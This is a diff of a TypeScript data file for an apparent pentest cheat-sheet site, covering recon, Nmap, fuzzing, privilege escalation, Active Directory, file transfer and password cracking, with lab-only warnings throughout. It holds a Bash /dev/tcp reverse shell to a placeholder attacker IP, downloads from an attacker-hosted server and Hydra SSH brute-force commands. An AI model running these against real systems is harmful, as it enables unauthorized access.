@@ -1,45 +1,37 @@
-import type { SecurityIconName } from './security-icons';
-
 export type CheatSheetCategory =
   | 'Recon'
   | 'Nmap'
   | 'Web Enumeration'
   | 'Fuzzing'
-  | 'CVE Research'
-  | 'Exploit Research'
-  | 'Linux PrivEsc'
-  | 'Windows PrivEsc'
-  | 'Active Directory'
+  | 'Linux Privilege Escalation'
+  | 'Windows Enumeration'
+  | 'Active Directory Basics'
   | 'Reverse Shells'
   | 'File Transfer'
   | 'Password Attacks'
   | 'Forensics'
-  | 'Malware Analysis'
+  | 'Malware Analysis Basics'
   | 'SOC / Detection'
   | 'Useful Links';
 
-export type CheatSheetCommand = {
-  label: string;
-  code: string;
-  copy?: boolean;
-};
-
-export type CheatSheetLink = {
-  label: string;
-  href: string;
-};
+export type CheatSheetLanguage = 'bash' | 'powershell' | 'yaml' | 'yara' | 'text';
 
 export type CheatSheetEntry = {
-  id: string;
   title: string;
-  category: CheatSheetCategory;
+  command: string;
+  language: CheatSheetLanguage;
   description: string;
-  icon: SecurityIconName;
+  whenToUse: string;
+  notes: string;
+  exampleOutput?: string;
   tags: string[];
-  warning?: string;
-  commands: CheatSheetCommand[];
-  notes: string[];
-  links?: CheatSheetLink[];
+};
+
+export type CheatSheetCategorySection = {
+  category: CheatSheetCategory;
+  slug: string;
+  summary: string;
+  entries: CheatSheetEntry[];
 };
 
 export const categoryOrder: CheatSheetCategory[] = [
@@ -47,361 +39,638 @@ export const categoryOrder: CheatSheetCategory[] = [
   'Nmap',
   'Web Enumeration',
   'Fuzzing',
-  'CVE Research',
-  'Exploit Research',
-  'Linux PrivEsc',
-  'Windows PrivEsc',
-  'Active Directory',
+  'Linux Privilege Escalation',
+  'Windows Enumeration',
+  'Active Directory Basics',
   'Reverse Shells',
   'File Transfer',
   'Password Attacks',
   'Forensics',
-  'Malware Analysis',
+  'Malware Analysis Basics',
   'SOC / Detection',
   'Useful Links'
 ];
 
-export const cheatSheets: CheatSheetEntry[] = [
+export const cheatSheetSections: CheatSheetCategorySection[] = [
   {
-    id: 'recon-basics',
-    title: 'Recon Baseline',
     category: 'Recon',
-    description: 'First-pass DNS, ownership, TLS, and HTTP checks before deeper enumeration.',
-    icon: 'radar',
-    tags: ['dns', 'http', 'headers', 'tls', 'scope'],
-    warning: 'Run only against lab targets, owned assets, or approved scope.',
-    commands: [
-      { label: 'WHOIS lookup', code: 'whois example.com', copy: true },
-      { label: 'DNS records', code: 'dig example.com A AAAA MX TXT NS +short', copy: true },
-      { label: 'Resolver check', code: 'nslookup example.com 1.1.1.1', copy: true },
-      { label: 'HTTP headers', code: 'curl -I https://example.com', copy: true }
-    ],
-    notes: [
-      'Write down scope boundaries before scanning.',
-      'Compare DNS results across resolvers when answers look inconsistent.',
-      'Headers can reveal proxies, framework hints, cookies, and security controls.'
+    slug: 'recon',
+    summary: 'Quiet first-pass discovery for scope, DNS, ownership, TLS, and exposed HTTP behavior.',
+    entries: [
+      {
+        title: 'WHOIS ownership lookup',
+        command: 'whois <domain>',
+        language: 'bash',
+        description: 'Queries public registration data for a domain, including registrar, name servers, and contact metadata when available.',
+        whenToUse: 'Use at the start of authorized external recon to understand ownership and DNS delegation.',
+        notes: 'WHOIS data can be privacy-protected or stale. Treat it as context, not proof of control.',
+        exampleOutput: 'Registrar, creation date, name server, and registry status fields.',
+        tags: ['dns', 'osint', 'scope']
+      },
+      {
+        title: 'DNS record sweep',
+        command: 'dig <domain> A AAAA MX TXT NS +short',
+        language: 'bash',
+        description: 'Requests common DNS record types and prints compact answers for quick review.',
+        whenToUse: 'Use when mapping mail, name server, and verification records for an approved domain.',
+        notes: 'Compare answers from more than one resolver if results look inconsistent.',
+        tags: ['dns', 'records', 'recon']
+      },
+      {
+        title: 'Certificate subject names',
+        command: 'echo | openssl s_client -connect <domain>:443 -servername <domain> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName',
+        language: 'bash',
+        description: 'Connects to a TLS service and extracts certificate identity, issuer, validity dates, and subject alternative names.',
+        whenToUse: 'Use when validating hostnames, expired certificates, or adjacent names in authorized infrastructure.',
+        notes: 'Certificate names can reveal related assets, but they do not automatically expand testing scope.',
+        tags: ['tls', 'certificate', 'scope']
+      },
+      {
+        title: 'HTTP headers only',
+        command: 'curl -I https://<domain>/',
+        language: 'bash',
+        description: 'Fetches response headers without downloading the full response body.',
+        whenToUse: 'Use to inspect server hints, redirects, cookies, and security headers with minimal traffic.',
+        notes: 'Headers can differ by path, method, host header, and authentication state.',
+        tags: ['http', 'headers', 'curl']
+      }
     ]
   },
   {
-    id: 'nmap-core',
-    title: 'Nmap Core Scans',
     category: 'Nmap',
-    description: 'A compact scan ladder for CTF and authorized pentest service discovery.',
-    icon: 'target',
-    tags: ['ports', 'services', 'udp', 'scripts', 'output'],
-    commands: [
-      { label: 'Quick TCP scan', code: 'sudo nmap -Pn -sS --top-ports 1000 -oA scans/quick TARGET_IP', copy: true },
-      { label: 'Full TCP scan', code: 'sudo nmap -Pn -p- --min-rate 5000 -oA scans/all TARGET_IP', copy: true },
-      { label: 'Service scan', code: 'sudo nmap -Pn -sCV -p PORTS -oA scans/services TARGET_IP', copy: true },
-      { label: 'UDP top ports', code: 'sudo nmap -Pn -sU --top-ports 50 -oA scans/udp TARGET_IP', copy: true }
-    ],
-    notes: [
-      'Use `-oA` so you keep normal, grepable, and XML output.',
-      'Do not treat a fast scan as complete coverage.',
-      'UDP scans are slower. Start small, then expand when needed.'
+    slug: 'nmap',
+    summary: 'Port and service discovery patterns for lab hosts and written-scope targets.',
+    entries: [
+      {
+        title: 'TCP SYN scan',
+        command: 'sudo nmap -sS -Pn -p- --min-rate 2000 <target>',
+        language: 'bash',
+        description: 'Performs a full TCP port sweep using SYN scanning and treats the host as online.',
+        whenToUse: 'Use during authorized lab enumeration when ICMP ping is blocked or unreliable.',
+        notes: 'Can be noisy. Confirm scope before running against any target.',
+        exampleOutput: 'Open TCP ports such as 22/tcp, 80/tcp, or 443/tcp.',
+        tags: ['tcp', 'ports', 'syn']
+      },
+      {
+        title: 'Service and version detection',
+        command: 'nmap -sCV -p <ports> -oA scans/services <target>',
+        language: 'bash',
+        description: 'Runs default scripts and version detection against selected ports, saving output in multiple formats.',
+        whenToUse: 'Use after a port sweep to identify services, versions, and common misconfigurations.',
+        notes: 'Default scripts are usually safe in labs, but still more intrusive than a simple connect scan.',
+        tags: ['services', 'versions', 'scripts']
+      },
+      {
+        title: 'Top UDP ports',
+        command: 'sudo nmap -sU --top-ports 50 -oA scans/udp-top <target>',
+        language: 'bash',
+        description: 'Checks the most common UDP ports and writes normal, grepable, and XML output.',
+        whenToUse: 'Use when TCP results are sparse or when DNS, SNMP, NTP, or VPN services may exist.',
+        notes: 'UDP scans are slow and can produce ambiguous open|filtered results.',
+        tags: ['udp', 'services', 'triage']
+      },
+      {
+        title: 'Save grepable scan output',
+        command: 'nmap -Pn -p <ports> -oA scans/<target>-selected <target>',
+        language: 'bash',
+        description: 'Runs a scoped scan and saves output as normal, grepable, and XML files under one basename.',
+        whenToUse: 'Use whenever scan results need to be reproducible or referenced later in notes.',
+        notes: 'Keep scan filenames generic if reports may be shared outside a private lab.',
+        tags: ['output', 'notes', 'evidence']
+      }
     ]
   },
   {
-    id: 'web-enum',
-    title: 'Web Enumeration',
     category: 'Web Enumeration',
-    description: 'HTTP checks for vhosts, responses, source hints, and authenticated workflow mapping.',
-    icon: 'search',
-    tags: ['curl', 'vhosts', 'burp', 'headers', 'source'],
-    commands: [
-      { label: 'Fetch response headers', code: 'curl -i http://target.local/', copy: true },
-      { label: 'Check vhost', code: 'curl -H "Host: app.target.local" -i http://TARGET_IP/', copy: true },
-      { label: 'List linked assets', code: 'curl -s http://target.local/ | grep -Eoi \'(href|src)="[^"]+\' | cut -d\'"\' -f2 | sort -u', copy: true },
-      { label: 'Save page for review', code: 'curl -s http://target.local/ -o page.html', copy: true }
-    ],
-    notes: [
-      'Map application roles and state-changing requests in Burp before testing.',
-      'Review JavaScript for API paths, feature flags, and client-side route names.',
-      'Use placeholders in notes until you verify exact endpoints.'
+    slug: 'web-enumeration',
+    summary: 'HTTP request inspection, virtual host checks, and source review for web labs.',
+    entries: [
+      {
+        title: 'Full HTTP response',
+        command: 'curl -i http://<target>/',
+        language: 'bash',
+        description: 'Prints response headers and body for a single HTTP request.',
+        whenToUse: 'Use to inspect redirects, cookies, status codes, and visible source from a web service.',
+        notes: 'Review state-changing actions in a proxy before replaying or modifying requests.',
+        tags: ['curl', 'headers', 'http']
+      },
+      {
+        title: 'Virtual host probe',
+        command: 'curl -H "Host: <domain>" -i http://<ip>/',
+        language: 'bash',
+        description: 'Sends a custom Host header to an IP address to test name-based virtual hosting.',
+        whenToUse: 'Use when DNS hints or certificates suggest multiple hostnames on one web server.',
+        notes: 'Only test hostnames inside the authorized scope.',
+        tags: ['vhost', 'host-header', 'http']
+      },
+      {
+        title: 'Extract linked paths',
+        command: 'curl -s http://<target>/ | grep -Eoi \'(href|src)="[^"]+\' | cut -d\'"\' -f2 | sort -u',
+        language: 'bash',
+        description: 'Downloads a page and extracts linked href and src values for quick manual review.',
+        whenToUse: 'Use during first-pass web mapping to find static assets, routes, and client-side files.',
+        notes: 'This does not replace crawling. JavaScript-rendered routes may not appear in raw HTML.',
+        tags: ['links', 'source', 'routes']
+      },
+      {
+        title: 'Inspect robots file',
+        command: 'curl -s http://<target>/robots.txt',
+        language: 'bash',
+        description: 'Fetches robots.txt to review paths that the site asks crawlers to avoid.',
+        whenToUse: 'Use when checking for intentionally exposed administrative, staging, or content paths.',
+        notes: 'Robots entries are not access control. Verify paths manually and stay in scope.',
+        tags: ['robots', 'paths', 'web']
+      }
     ]
   },
   {
-    id: 'fuzzing-directories',
-    title: 'Directory and Content Fuzzing',
     category: 'Fuzzing',
-    description: 'Safe discovery patterns for routes, extensions, and virtual hosts.',
-    icon: 'tool',
-    tags: ['ffuf', 'gobuster', 'feroxbuster', 'wordlists', 'vhost'],
-    warning: 'Tune rate limits for production tests and follow the engagement rules.',
-    commands: [
-      { label: 'ffuf directories', code: 'ffuf -u http://target.local/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404', copy: true },
-      { label: 'ffuf vhosts', code: 'ffuf -u http://TARGET_IP/ -H "Host: FUZZ.target.local" -w subdomains.txt -fs SIZE_TO_FILTER', copy: true },
-      { label: 'gobuster dirs', code: 'gobuster dir -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak', copy: true },
-      { label: 'feroxbuster light', code: 'feroxbuster -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt -x php,txt --rate-limit 25', copy: true }
-    ],
-    notes: [
-      'Filter by status, size, and words after getting a baseline 404.',
-      'Record wordlist and filters so findings are reproducible.',
-      'Avoid blind recursive fuzzing on fragile or out-of-scope systems.'
+    slug: 'fuzzing',
+    summary: 'Controlled route, extension, parameter, and virtual host discovery with clear filters.',
+    entries: [
+      {
+        title: 'Directory fuzzing',
+        command: 'ffuf -u http://<target>/FUZZ -w <wordlist> -mc all -fc 404',
+        language: 'bash',
+        description: 'Tests paths from a wordlist and hides standard 404 responses.',
+        whenToUse: 'Use in authorized labs after collecting a baseline response size and status code.',
+        notes: 'Tune rate and filters. Blind high-speed fuzzing can be noisy and disruptive.',
+        tags: ['ffuf', 'directories', 'wordlist']
+      },
+      {
+        title: 'Extension fuzzing',
+        command: 'ffuf -u http://<target>/FUZZ -w <wordlist> -e .php,.txt,.bak -fc 404',
+        language: 'bash',
+        description: 'Tests words with common file extensions appended.',
+        whenToUse: 'Use when a server stack hints at backup files, scripts, or text artifacts.',
+        notes: 'Do not assume a discovered backup file is safe to disclose publicly.',
+        tags: ['extensions', 'backup', 'ffuf']
+      },
+      {
+        title: 'Virtual host fuzzing',
+        command: 'ffuf -u http://<ip>/ -H "Host: FUZZ.<domain>" -w <wordlist> -fs <size>',
+        language: 'bash',
+        description: 'Fuzzes subdomain labels by changing the Host header while connecting to a known IP.',
+        whenToUse: 'Use when DNS, TLS, or app behavior suggests name-based routing.',
+        notes: 'Use response size filters only after confirming the default invalid-host response.',
+        tags: ['vhost', 'subdomain', 'host-header']
+      },
+      {
+        title: 'Parameter name fuzzing',
+        command: 'ffuf -u "http://<target>/page?FUZZ=test" -w <wordlist> -fs <size>',
+        language: 'bash',
+        description: 'Tests possible GET parameter names and filters out the baseline response size.',
+        whenToUse: 'Use on lab endpoints where hidden parameters may change application behavior.',
+        notes: 'Avoid sending payloads first. Find accepted parameter names before testing values.',
+        tags: ['parameters', 'ffuf', 'web']
+      }
     ]
   },
   {
-    id: 'cve-research',
-    title: 'CVE Research Workflow',
-    category: 'CVE Research',
-    description: 'Evidence-driven vulnerability research without inventing affected versions or exploitability.',
-    icon: 'file',
-    tags: ['cve', 'cvss', 'cwe', 'kev', 'epss', 'advisory'],
-    commands: [
-      { label: 'Search template', code: '"PRODUCT" "VERSION" CVE advisory', copy: true },
-      { label: 'Exploit query template', code: '"CVE-YYYY-NNNN" exploit PoC analysis', copy: true },
-      { label: 'Patch query template', code: '"PRODUCT" "VERSION" fixed in security advisory', copy: true }
-    ],
-    notes: [
-      'Placeholder format: CVE-YYYY-NNNN, vendor advisory, affected version, fixed version, CVSS, CWE, exploitability notes, patch status.',
-      'Prefer vendor advisories and primary sources before blog posts.',
-      'Confirm whether the vulnerable feature is reachable in your target context.'
-    ],
-    links: [
-      { label: 'NVD', href: 'https://nvd.nist.gov/' },
-      { label: 'MITRE CVE', href: 'https://cve.mitre.org/' },
-      { label: 'CISA KEV', href: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
-      { label: 'FIRST EPSS', href: 'https://www.first.org/epss/' },
-      { label: 'CVSS Calculator', href: 'https://www.first.org/cvss/calculator/3.1' },
-      { label: 'CWE', href: 'https://cwe.mitre.org/' }
+    category: 'Linux Privilege Escalation',
+    slug: 'linux-privilege-escalation',
+    summary: 'Low-noise local enumeration after getting an authorized low-privileged shell.',
+    entries: [
+      {
+        title: 'Identity and kernel context',
+        command: 'id; hostname; uname -a; cat /etc/os-release 2>/dev/null',
+        language: 'bash',
+        description: 'Prints current user identity, host name, kernel details, and distribution release information.',
+        whenToUse: 'Use immediately after landing in a Linux lab shell to establish local context.',
+        notes: 'Do not jump to kernel exploits without confirming patch level and safer paths first.',
+        tags: ['linux', 'identity', 'kernel']
+      },
+      {
+        title: 'List sudo permissions',
+        command: 'sudo -l',
+        language: 'bash',
+        description: 'Shows commands the current user may run through sudo and whether a password is required.',
+        whenToUse: 'Use when checking for intended lab privilege boundaries or misconfigured sudo rules.',
+        notes: 'Avoid running privileged commands until you understand their side effects.',
+        tags: ['sudo', 'permissions', 'privesc']
+      },
+      {
+        title: 'Search SUID binaries',
+        command: 'find / -perm -4000 -type f 2>/dev/null',
+        language: 'bash',
+        description: 'Lists files with the SUID bit set, which may run with the file owner privileges.',
+        whenToUse: 'Use during Linux privilege escalation review after gaining a low-privileged shell in a lab.',
+        notes: 'Investigate unusual binaries manually. Do not assume every SUID binary is exploitable.',
+        tags: ['suid', 'linux', 'permissions']
+      },
+      {
+        title: 'Review file capabilities',
+        command: 'getcap -r / 2>/dev/null',
+        language: 'bash',
+        description: 'Recursively lists Linux file capabilities that grant specific privileged operations.',
+        whenToUse: 'Use when SUID checks are clean but binaries may have delegated privileges.',
+        notes: 'Capabilities are granular. Confirm what each capability allows before testing.',
+        tags: ['capabilities', 'linux', 'privesc']
+      }
     ]
   },
   {
-    id: 'exploit-research',
-    title: 'Exploit Research Checklist',
-    category: 'Exploit Research',
-    description: 'A repeatable way to evaluate public PoCs before using them in a lab.',
-    icon: 'flask',
-    tags: ['poc', 'triage', 'patch', 'lab', 'opsec'],
-    warning: 'Read code before running it. Treat public PoCs as untrusted software.',
-    commands: [
-      { label: 'Static review', code: 'grep -RniE "curl|wget|socket|subprocess|os.system|exec|eval|base64" ./poc-directory', copy: true },
-      { label: 'Isolated test env', code: 'python3 -m venv .venv && source .venv/bin/activate', copy: true },
-      { label: 'Container lab note', code: 'docker run --rm -it --network none IMAGE_NAME /bin/bash', copy: true }
-    ],
-    notes: [
-      'Validate target version, configuration, authentication state, and reachable attack surface.',
-      'Prefer reproducing the vulnerable condition over blind exploit execution.',
-      'Keep exploit artifacts separated from client or personal files.'
-    ],
-    links: [
-      { label: 'Exploit-DB', href: 'https://www.exploit-db.com/' },
-      { label: 'GitHub Advisories', href: 'https://github.com/advisories' }
+    category: 'Windows Enumeration',
+    slug: 'windows-enumeration',
+    summary: 'Windows host, user, service, task, and network context for approved labs.',
+    entries: [
+      {
+        title: 'Current token details',
+        command: 'whoami /all',
+        language: 'powershell',
+        description: 'Displays the current user, groups, privileges, and integrity level.',
+        whenToUse: 'Use after obtaining a Windows shell to understand the current security context.',
+        notes: 'Disabled privileges may still matter, but do not imply immediate administrative control.',
+        tags: ['windows', 'token', 'privileges']
+      },
+      {
+        title: 'System version summary',
+        command: 'systeminfo',
+        language: 'powershell',
+        description: 'Prints OS version, build, hotfix, domain, boot time, and hardware summary.',
+        whenToUse: 'Use during initial Windows enumeration to guide compatibility and patch-level research.',
+        notes: 'Do not rely on OS build alone for vulnerability claims. Confirm installed patches.',
+        tags: ['windows', 'system', 'patches']
+      },
+      {
+        title: 'Auto-start services',
+        command: 'Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, State, StartName, PathName',
+        language: 'powershell',
+        description: 'Lists automatically starting services with state, service account, and executable path.',
+        whenToUse: 'Use when reviewing persistence-like service behavior or weak service configuration in a lab.',
+        notes: 'Service changes can break hosts. Inspect permissions before modifying anything.',
+        tags: ['services', 'powershell', 'windows']
+      },
+      {
+        title: 'Scheduled task review',
+        command: 'Get-ScheduledTask | Select-Object TaskName, TaskPath, State',
+        language: 'powershell',
+        description: 'Lists scheduled tasks and their basic state for quick triage.',
+        whenToUse: 'Use when looking for recurring scripts, maintenance jobs, or lab privilege boundaries.',
+        notes: 'Task action details require additional review with Get-ScheduledTaskInfo or XML export.',
+        tags: ['tasks', 'windows', 'enumeration']
+      }
     ]
   },
   {
-    id: 'linux-privesc',
-    title: 'Linux Privilege Escalation',
-    category: 'Linux PrivEsc',
-    description: 'Low-noise local checks after an authorized shell in a CTF or lab.',
-    icon: 'terminal',
-    tags: ['linux', 'sudo', 'suid', 'capabilities', 'cron'],
-    commands: [
-      { label: 'Identity and host', code: 'id; hostname; uname -a; cat /etc/os-release 2>/dev/null', copy: true },
-      { label: 'Sudo rights', code: 'sudo -l', copy: true },
-      { label: 'SUID files', code: 'find / -perm -4000 -type f 2>/dev/null', copy: true },
-      { label: 'Capabilities', code: 'getcap -r / 2>/dev/null', copy: true },
-      { label: 'Writable paths', code: 'find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/sys|^/dev"', copy: true }
-    ],
-    notes: [
-      'Check config files for credentials before reaching for kernel exploits.',
-      'Correlate cron jobs with writable scripts and PATH assumptions.',
-      'Document every privilege boundary crossed.'
+    category: 'Active Directory Basics',
+    slug: 'active-directory-basics',
+    summary: 'Domain context and LDAP/Kerberos checks for authorized AD practice networks.',
+    entries: [
+      {
+        title: 'Domain controller discovery',
+        command: 'nltest /dsgetdc:<domain>',
+        language: 'powershell',
+        description: 'Asks Windows to locate a domain controller for the specified domain.',
+        whenToUse: 'Use on a domain-joined lab host to confirm domain name, DC, and site context.',
+        notes: 'Only enumerate domains where you have explicit authorization.',
+        tags: ['ad', 'domain-controller', 'windows']
+      },
+      {
+        title: 'LDAP naming contexts',
+        command: 'ldapsearch -x -H ldap://<ip> -s base namingcontexts',
+        language: 'bash',
+        description: 'Queries LDAP RootDSE for base naming contexts exposed by a directory server.',
+        whenToUse: 'Use to identify domain distinguished names before scoped LDAP queries.',
+        notes: 'Anonymous LDAP may be disabled. Authentication changes what you can see.',
+        tags: ['ldap', 'rootdse', 'ad']
+      },
+      {
+        title: 'Kerberos clock check',
+        command: 'ntpdate -q <domain-controller-ip>',
+        language: 'bash',
+        description: 'Checks time offset against a domain controller without setting the local clock.',
+        whenToUse: 'Use before Kerberos testing when authentication fails unexpectedly.',
+        notes: 'Large time skew can break Kerberos. Fix your lab clock through approved means.',
+        tags: ['kerberos', 'time', 'ad']
+      },
+      {
+        title: 'Domain user listing',
+        command: 'Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName',
+        language: 'powershell',
+        description: 'Lists Active Directory user account names when the AD PowerShell module is available.',
+        whenToUse: 'Use in an authorized admin or lab context to inventory accounts.',
+        notes: 'Account lists are sensitive. Store outputs securely and sanitize reports.',
+        tags: ['users', 'powershell', 'ad']
+      }
     ]
   },
   {
-    id: 'windows-privesc',
-    title: 'Windows Privilege Escalation',
-    category: 'Windows PrivEsc',
-    description: 'Windows local enumeration commands for labs and approved testing.',
-    icon: 'platform',
-    tags: ['windows', 'powershell', 'services', 'tasks', 'privileges'],
-    commands: [
-      { label: 'Identity and privileges', code: 'whoami /all', copy: true },
-      { label: 'System details', code: 'systeminfo', copy: true },
-      { label: 'Service review', code: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto"', copy: true },
-      { label: 'Scheduled tasks', code: 'schtasks /query /fo LIST /v', copy: true },
-      { label: 'PowerShell paths', code: 'Get-ChildItem Env:Path; Get-LocalUser 2>$null', copy: true }
-    ],
-    notes: [
-      'Look for service paths, weak file permissions, and credential reuse.',
-      'Confirm OS build before researching local privilege escalation CVEs.',
-      'Avoid changing services until you understand recovery impact.'
-    ]
-  },
-  {
-    id: 'active-directory-enum',
-    title: 'Active Directory Enumeration',
-    category: 'Active Directory',
-    description: 'Domain discovery and graph collection flow for authorized AD labs.',
-    icon: 'network',
-    tags: ['ad', 'ldap', 'kerberos', 'bloodhound', 'domain'],
-    warning: 'Only enumerate domains where you have written authorization.',
-    commands: [
-      { label: 'Domain context', code: 'whoami /fqdn && nltest /dsgetdc:DOMAIN.LOCAL', copy: true },
-      { label: 'LDAP root DSE', code: 'ldapsearch -x -H ldap://DC_IP -s base namingcontexts', copy: true },
-      { label: 'Kerberos userenum placeholder', code: 'kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL users.txt', copy: true },
-      { label: 'BloodHound collection placeholder', code: 'bloodhound-python -d DOMAIN.LOCAL -u USER -p PASS -ns DC_IP -c All', copy: true }
-    ],
-    notes: [
-      'Start with domain, DC, DNS, and time sync checks.',
-      'Use graph tools to reason about relationships, not as a replacement for validation.',
-      'Store credentials and collection output securely.'
-    ]
-  },
-  {
-    id: 'reverse-shells',
-    title: 'Reverse Shell Placeholders',
     category: 'Reverse Shells',
-    description: 'Common lab shell patterns with explicit placeholder values.',
-    icon: 'terminal',
-    tags: ['shell', 'listener', 'tcp', 'stabilization'],
-    warning: 'Use these only in CTF, lab, or approved testing environments.',
-    commands: [
-      { label: 'Listener', code: 'nc -lvnp 4444', copy: true },
-      { label: 'Bash placeholder', code: 'bash -c \'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\'', copy: true },
-      { label: 'Python pty', code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'', copy: true },
-      { label: 'TTY basics', code: 'export TERM=xterm; stty rows 40 cols 120', copy: true }
-    ],
-    notes: [
-      'Replace YOUR_IP with your VPN or lab interface address.',
-      'Prefer stable, logged, authorized access methods when available.',
-      'Record where the shell came from and which user context it runs under.'
+    slug: 'reverse-shells',
+    summary: 'Lab-safe listener and shell placeholders with explicit attacker IP and port fields.',
+    entries: [
+      {
+        title: 'Netcat listener',
+        command: 'nc -lvnp <port>',
+        language: 'bash',
+        description: 'Starts a TCP listener on a local port and prints incoming connection data.',
+        whenToUse: 'Use in CTFs or isolated labs when an exercise requires receiving a reverse connection.',
+        notes: 'Bind only on the intended lab interface and close the listener when finished.',
+        tags: ['listener', 'tcp', 'lab']
+      },
+      {
+        title: 'Bash reverse shell placeholder',
+        command: 'bash -c \'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1\'',
+        language: 'bash',
+        description: 'Starts an interactive Bash session that connects back to a listener.',
+        whenToUse: 'Use only in controlled labs where reverse shell execution is explicitly part of the exercise.',
+        notes: 'Replace placeholders with lab values. Do not run against systems outside written scope.',
+        tags: ['bash', 'reverse-shell', 'placeholder']
+      },
+      {
+        title: 'Python PTY upgrade',
+        command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+        language: 'bash',
+        description: 'Spawns a pseudo-terminal to make a basic shell more usable.',
+        whenToUse: 'Use after receiving a lab shell that lacks line editing or terminal behavior.',
+        notes: 'This improves interaction but does not change authorization or privilege level.',
+        tags: ['pty', 'shell', 'linux']
+      },
+      {
+        title: 'Terminal sizing',
+        command: 'export TERM=xterm; stty rows 40 cols 120',
+        language: 'bash',
+        description: 'Sets terminal type and dimensions for a shell session.',
+        whenToUse: 'Use when full-screen tools render poorly after a lab shell is stabilized.',
+        notes: 'Match rows and columns to your local terminal for best results.',
+        tags: ['tty', 'terminal', 'shell']
+      }
     ]
   },
   {
-    id: 'file-transfer',
-    title: 'File Transfer',
     category: 'File Transfer',
-    description: 'Simple transfer patterns for moving tools, logs, and evidence in labs.',
-    icon: 'archive',
-    tags: ['http', 'scp', 'curl', 'wget', 'powershell'],
-    commands: [
-      { label: 'Serve current directory', code: 'python3 -m http.server 8000', copy: true },
-      { label: 'Linux download', code: 'curl -O http://YOUR_IP:8000/file.txt', copy: true },
-      { label: 'wget download', code: 'wget http://YOUR_IP:8000/file.txt -O file.txt', copy: true },
-      { label: 'PowerShell download', code: 'iwr http://YOUR_IP:8000/file.txt -OutFile file.txt', copy: true },
-      { label: 'SCP copy', code: 'scp file.txt user@TARGET_IP:/tmp/file.txt', copy: true }
-    ],
-    notes: [
-      'Hash evidence before and after transfer when integrity matters.',
-      'Avoid placing tools in sensitive production directories.',
-      'Remove temporary listeners when finished.'
+    slug: 'file-transfer',
+    summary: 'Simple movement of tools, notes, and evidence with integrity checks.',
+    entries: [
+      {
+        title: 'Serve a local folder',
+        command: 'python3 -m http.server <port>',
+        language: 'bash',
+        description: 'Starts a basic HTTP server from the current directory.',
+        whenToUse: 'Use inside a lab network to serve approved tools or notes to a target host.',
+        notes: 'Serve from a clean folder and stop the process when transfer is complete.',
+        tags: ['http', 'python', 'transfer']
+      },
+      {
+        title: 'Download with curl',
+        command: 'curl -O http://<attacker-ip>:<port>/<file>',
+        language: 'bash',
+        description: 'Downloads a file from an HTTP server and keeps the remote filename.',
+        whenToUse: 'Use on Linux or macOS targets where curl is available.',
+        notes: 'Hash files before and after transfer when preserving evidence integrity.',
+        tags: ['curl', 'download', 'linux']
+      },
+      {
+        title: 'PowerShell web download',
+        command: 'Invoke-WebRequest -Uri "http://<attacker-ip>:<port>/<file>" -OutFile "<file>"',
+        language: 'powershell',
+        description: 'Downloads a file over HTTP using PowerShell.',
+        whenToUse: 'Use in Windows labs when transferring approved scripts or evidence files.',
+        notes: 'Respect execution policy and logging requirements in defensive environments.',
+        tags: ['powershell', 'download', 'windows']
+      },
+      {
+        title: 'SCP copy to remote host',
+        command: 'scp <file> <user>@<ip>:/tmp/<file>',
+        language: 'bash',
+        description: 'Copies a file to a remote host over SSH.',
+        whenToUse: 'Use when valid SSH access exists and a logged, authenticated transfer is preferred.',
+        notes: 'Avoid placing files in sensitive system directories unless explicitly required.',
+        tags: ['scp', 'ssh', 'transfer']
+      }
     ]
   },
   {
-    id: 'password-attacks',
-    title: 'Password Attack Workflow',
     category: 'Password Attacks',
-    description: 'Controlled hash cracking and password audit commands for authorized scenarios.',
-    icon: 'shield',
-    tags: ['hashcat', 'john', 'hydra', 'wordlists', 'audit'],
-    warning: 'Do not test credentials against systems outside written scope.',
-    commands: [
-      { label: 'Identify hash', code: 'hashid hash.txt', copy: true },
-      { label: 'Hashcat bcrypt example', code: 'hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --username', copy: true },
-      { label: 'John format example', code: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', copy: true },
-      { label: 'Lab login test placeholder', code: 'hydra -L users.txt -P passwords.txt TARGET_IP ssh -t 4 -V', copy: true }
-    ],
-    notes: [
-      'Prefer offline hash cracking when hashes are legitimately obtained.',
-      'Rate-limit online tests and follow lockout policies.',
-      'Never store recovered passwords in public reports unless explicitly required and sanitized.'
+    slug: 'password-attacks',
+    summary: 'Authorized password audit and offline hash cracking workflow notes.',
+    entries: [
+      {
+        title: 'Identify hash format',
+        command: 'hashid <hash-file>',
+        language: 'bash',
+        description: 'Attempts to identify possible hash algorithms from provided hash strings.',
+        whenToUse: 'Use before choosing a cracking mode for legitimately obtained lab hashes.',
+        notes: 'Hash identification can be ambiguous. Confirm with source context when possible.',
+        tags: ['hashes', 'identification', 'offline']
+      },
+      {
+        title: 'John wordlist crack',
+        command: 'john --wordlist=<wordlist> <hash-file>',
+        language: 'bash',
+        description: 'Runs John the Ripper against a hash file using a specified wordlist.',
+        whenToUse: 'Use for authorized offline password audits or CTF hash challenges.',
+        notes: 'Handle recovered passwords as sensitive data and sanitize shared notes.',
+        tags: ['john', 'wordlist', 'offline']
+      },
+      {
+        title: 'Hashcat mode placeholder',
+        command: 'hashcat -m <mode> <hash-file> <wordlist>',
+        language: 'bash',
+        description: 'Runs Hashcat with an explicit mode, hash file, and wordlist.',
+        whenToUse: 'Use when you know the hash type and have permission to perform offline cracking.',
+        notes: 'Wrong modes waste time and can produce misleading status output.',
+        tags: ['hashcat', 'gpu', 'offline']
+      },
+      {
+        title: 'Scoped SSH login audit',
+        command: 'hydra -L <users> -P <wordlist> ssh://<target> -t 4',
+        language: 'bash',
+        description: 'Tests username and password combinations against SSH with a limited thread count.',
+        whenToUse: 'Use only when online credential testing is explicitly allowed in the rules of engagement.',
